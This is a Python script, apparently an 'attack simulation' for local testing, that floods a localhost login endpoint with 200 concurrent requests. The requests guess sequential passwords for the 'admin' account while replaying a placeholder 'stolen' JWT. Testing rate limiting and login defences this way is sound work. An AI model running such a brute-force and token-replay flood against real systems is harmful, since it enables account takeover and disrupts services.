import requests
import time
import concurrent.futures
import sys

URL = "http://127.0.0.1:8000/login"
TOKEN = "eyJhbGc.stolen.token.123"

def send_request(i):
    headers = {"Authorization": f"Bearer {TOKEN}"}
    payload = {"user": "admin", "password": f"pass{i}"}
    try:
        resp = requests.post(URL, headers=headers, json=payload, timeout=5)
        return i, resp.status_code, None
    except Exception as e:
        return i, None, str(e)

def run_attack(num_requests=200, workers=20):
    print(f"[*] Starting attack simulation: {num_requests} concurrent POST requests...")
    print(f"[*] Payload configuration: Reusing stolen JWT token '{TOKEN[:10]}...'")
    
    start_time = time.time()
    success_count = 0
    error_count = 0
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(send_request, i) for i in range(num_requests)]
        
        for future in concurrent.futures.as_completed(futures):
            req_id, status, error = future.result()
            if error:
                error_count += 1
                sys.stdout.write(f"\r[!] Request {req_id} failed: {error[:30]}...")
            else:
                success_count += 1
                sys.stdout.write(f"\r[+] Requests completed: {success_count}/{num_requests}")
            sys.stdout.flush()

    elapsed = time.time() - start_time
    print(f"\n\n[*] Attack finished in {elapsed:.2f} seconds.")
    print(f"[*] Summary: {success_count} successful, {error_count} failed.")

if __name__ == "__main__":
    run_attack()

